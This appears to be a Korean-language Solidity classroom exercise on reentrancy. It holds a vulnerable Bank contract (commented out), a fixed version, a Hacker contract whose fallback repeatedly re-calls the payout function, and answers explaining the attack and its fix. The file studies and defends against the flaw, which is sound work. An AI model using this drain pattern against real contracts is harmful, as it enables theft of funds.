// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

/* 시나리오: Bank가 사용자들에게 1,000,000 wei씩 지급 */

// contract Bank {
//     mapping (address => bool) private alreadyReceivedFund;
//     //alreadyReceivedFund[address]=bool
 
//     constructor() public payable {				        // 배포시 전달되는 ether를 받기 위해 payable로 선언
//     }
    
//     function checkBankBalance()                         // Bank 계정의 ether 잔고를 확인
//         public view returns (uint256) 
//     {	
//         return address(this).balance;
//     }
    
//     function checkUserState(address user)               // 사용자 계정이 이미 ether를 지급받았는지 검사
//         public view returns (bool)                      // false: 미지급, true: 지급
//     {	
//         return alreadyReceivedFund[user];
//     }
    
//     function giveFreeEther(address payable user) public {
//         if ((alreadyReceivedFund[user] == false)        // 사용자 계정이 미지급(false) 상태인지 검사
//             && (address(this).balance >= 1000000))      // Bank 계정의 잔고가 1,000,000 wei보다 큰지 검사 
//         {		
//             user.call {value: 1000000} ("");            // 사용자 계정에 1,000,000 wei 송금
//             alreadyReceivedFund[user] = true;			// 사용자 계정의 상태를 지급(true)으로 변경            			
//         }
//     }
// }

contract Bank {
    mapping (address => bool) private alreadyReceivedFund;
    //alreadyReceivedFund[address]=bool
 
    constructor() public payable {				        // 배포시 전달되는 ether를 받기 위해 payable로 선언
    }
    
    function checkBankBalance()                         // Bank 계정의 ether 잔고를 확인
        public view returns (uint256) 
    {	
        return address(this).balance;
    }
    
    function checkUserState(address user)               // 사용자 계정이 이미 ether를 지급받았는지 검사
        public view returns (bool)                      // false: 미지급, true: 지급
    {	
        return alreadyReceivedFund[user];
    }
    
    function giveFreeEther(address payable user) public {
        if ((alreadyReceivedFund[user] == false)        // 사용자 계정이 미지급(false) 상태인지 검사
            && (address(this).balance >= 1000000))      // Bank 계정의 잔고가 1,000,000 wei보다 큰지 검사 
        {		alreadyReceivedFund[user] = true;			// 사용자 계정의 상태를 지급(true)으로 변경   
            user.call {value: 1000000} ("");            // 사용자 계정에 1,000,000 wei 송금
                     			
        }
    }
}
contract Hacker {
    function checkHackerBalance()                       // Attacker 계정의 ether 잔고를 확인
        public view returns (uint256) 
    {	
        return address(this).balance;
    }
    
    fallback() external payable { 				        // Bank가 송금하는 ether를 수신하기 위한 fallback 함수
        address payable bankAddress = payable(msg.sender);		// Bank의 주소를 확보
        Bank X = Bank(bankAddress);				        // Bank의 주소를 Bank 컨트랙트 자료형으로 변환
        X.giveFreeEther(payable(address(this)));				    // Bank의 withdraw 함수를 호출 (재귀적 호출이 반복)
    }
}

/* 컨트랙트 실행을 통한 확인
(1) Bank 배포 (5,000,000 wei 송금)
(2) checkBankBalance( ) 실행 --> 5,000,000
(3) Hacker 배포
(4) checkHackerBalance( ) 실행 --> 0
(5) Bank의 giveFreeEther( ) 실행 (인자값: Hacker 주소)
(6) checkBankBalance( ) 및 checkHackerBalance( ) 실행 
    * Bank: 0
    * hacker: 5,000,000
*/

// (연습문제 1) 위와 같은 공격이 왜 성공할 수 있는지 생각해보시오.
//fallback 함수는 msg.data가 비어 있지 않을 때 호출됨. msg.data가 비어 있지만 hacker에 recieve가 없어서 fallback이 대신 호출
//이 때 fallback에서 다시 giveFreeEther 함수를 호출하는데, 아직 true로 update하기 이전이라서 계속 인출됨 
// 
// (연습문제 2) Hacker의 공격을 막을 수 있도록 Bank 컨트랙트를 수정하시오.
//call해서 fallback을 호출하기 전에 already 변수를 true로 변경하면 if문에 걸리면서 인출이 안 될 것. 